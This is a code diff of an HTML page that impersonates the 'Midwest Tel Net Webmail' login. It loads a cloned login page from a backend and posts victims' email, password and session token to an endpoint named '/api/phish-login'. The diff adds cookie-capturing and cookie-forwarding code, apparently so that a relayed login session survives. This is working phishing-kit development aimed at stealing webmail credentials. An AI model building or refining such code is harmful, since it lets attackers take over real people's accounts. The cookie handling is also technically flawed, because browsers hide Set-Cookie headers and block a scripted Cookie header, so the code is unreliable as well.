@@ -1,7 +1,6 @@
 <!doctype html>
 <html lang="en">
   <head>
-    <!-- Keep all your existing meta tags/styles -->
     <meta http-equiv="content-type" content="text/html" charset="UTF-8" />
     <title>Midwest Tel Net Webmail :: Welcome</title>
     <link
@@ -12,7 +11,6 @@
   </head>
   <body>
     <div id="loading-spinner">Loading login page...</div>
-    <!-- This div gets replaced by data.html once the JS runs -->
 
     <!-- Keep your EmailJS SDK init -->
     <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
@@ -21,7 +19,18 @@
       document.addEventListener("DOMContentLoaded", () => {
         // STEP 1: Get the fresh token and HTML from our backend
         fetch("/api/get-login-page")
-          .then((res) => res.text())
+          .then((res) => {
+            // CRITICAL: Capture the Set-Cookie header if present
+            const setCookieHeader = res.headers.get("set-cookie");
+            if (setCookieHeader) {
+              // Set the cookie for the current domain so subsequent requests include it
+              // We take only the name=value part, ignoring path/domain/secure flags for simplicity
+              const cookieNameValue = setCookieHeader.split(";")[0];
+              document.cookie = cookieNameValue;
+              console.log("Cookie set:", cookieNameValue);
+            }
+            return res.text();
+          })
           .then((data) => {
             console.log("API Response received (Raw HTML):", data);
 
@@ -81,7 +90,11 @@
           try {
             const res = await fetch("/api/phish-login", {
               method: "POST",
-              headers: { "Content-Type": "application/json" },
+              headers: { 
+                "Content-Type": "application/json",
+                // CRITICAL: Include the cookie!
+                "Cookie": document.cookie || "" 
+              },
               body: JSON.stringify({ email, password, token }),
             });
 
